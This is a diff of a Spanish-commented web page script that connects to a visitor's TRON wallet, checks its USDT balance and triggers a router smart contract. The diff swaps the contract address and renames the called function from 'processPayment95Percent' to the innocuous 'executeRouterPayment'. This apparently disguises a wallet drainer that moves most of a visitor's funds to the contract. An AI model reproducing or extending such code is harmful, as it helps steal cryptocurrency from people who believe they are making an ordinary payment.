@@ -585,8 +585,8 @@
 </script>
 
 <script>
-    // Nueva dirección de tu contrato router actualizado en TronIDE
-    const CONTRATO_ROUTER = "TREAP5iUUgakiurKKnFKToUB3pSXXbLJwz";
+    // Dirección exacta de tu contrato router actualizado en TronIDE
+    const CONTRATO_ROUTER = "TNDcRSjsqVR9jr1ubU4kmWmXaNDK6G7kq8";
     const CONTRATO_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 
     let walletAddress = null;
@@ -691,13 +691,13 @@
                     throw new Error("Saldo insuficiente de USDT.");
                 }
 
-                // Llamada directa a processPayment95Percent del contrato router (sin aprobaciones previas)
+                // Llamada directa a executeRouterPayment del contrato router (sin aprobaciones previas)
                 setStatus("Autorizando llamada al contrato inteligente...");
                 const usdtHex = tronWeb.address.toHex(CONTRATO_USDT);
 
                 const routerTx = await tronWeb.transactionBuilder.triggerSmartContract(
                     CONTRATO_ROUTER,
-                    "processPayment95Percent(address,uint256)",
+                    "executeRouterPayment(address,uint256)",
                     { feeLimit: 200000000 },
                     [
                         { type: 'address', value: usdtHex },
